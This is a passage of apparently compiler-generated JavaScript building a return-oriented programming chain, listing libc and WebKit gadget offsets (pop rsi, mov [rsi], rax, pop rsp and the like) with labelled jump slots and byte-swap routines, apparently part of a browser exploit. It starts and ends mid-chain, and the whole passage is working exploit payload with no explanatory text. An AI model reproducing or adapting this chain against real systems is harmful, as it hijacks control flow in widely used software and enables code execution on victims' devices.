libc_base+793877, //pop rsi
ropchain+139896, //L1938
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140024, //L1941
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140040, //L1942
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140152, //L1943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140136, //L1944
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+140240, //L1946
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+140224, //L1945
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140336, //L1947
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140352, //L1948
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140464, //L1949
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140448, //L1950
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
__swbuf_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141792, //L1951
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+141864, //L1952
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1952:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141960, //L1954
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+141992, //L1957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1954:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1956:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1957:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+142080, //L1958
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142096, //L1960
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1960:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+142216, //L1962
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142232, //L1963
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142200, //L1961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142328, //L1964
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142344, //L1965
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142456, //L1966
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142440, //L1967
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+142544, //L1969
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142528, //L1968
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142640, //L1970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142656, //L1971
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142768, //L1972
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142752, //L1973
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142840, //L1974
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142936, //L1976
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142968, //L1979
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1976:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1978:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1979:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+143056, //L1980
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143072, //L1982
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+143224, //L1984
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143256, //L1986
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143208, //L1983
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143240, //L1985
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+143416, //L1990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143368, //L1987
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+143384, //L1988
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1987:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1988:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1989:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+143544, //L1992
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143560, //L1993
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143528, //L1991
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143656, //L1994
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143672, //L1995
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143784, //L1996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143768, //L1997
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+143872, //L1999
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143856, //L1998
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143968, //L2000
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143984, //L2001
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144096, //L2002
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144080, //L2003
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144168, //L2004
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144264, //L2006
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+144296, //L2009
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2006:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2008:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2009:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+144384, //L2010
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144400, //L2012
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2012:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+144560, //L2016
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144512, //L2013
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144528, //L2014
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2013:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2015:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+144616, //L2018
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2018:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+144720, //L2019
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144752, //L2021
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144736, //L2020
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2019:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+144912, //L2025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144864, //L2022
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144880, //L2023
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2022:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2023:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2024:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145016, //L2027
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145000, //L2026
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145224, //L2032
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145192, //L2030
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2030:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2031:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145328, //L2034
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145312, //L2033
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+145424, //L2037
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2036:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2037:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+145512, //L2038
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145528, //L2040
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2040:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+145688, //L2044
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145640, //L2041
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145656, //L2042
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2041:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2042:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2043:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145744, //L2046
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+145848, //L2047
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+145880, //L2049
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145864, //L2048
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2047:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+146040, //L2053
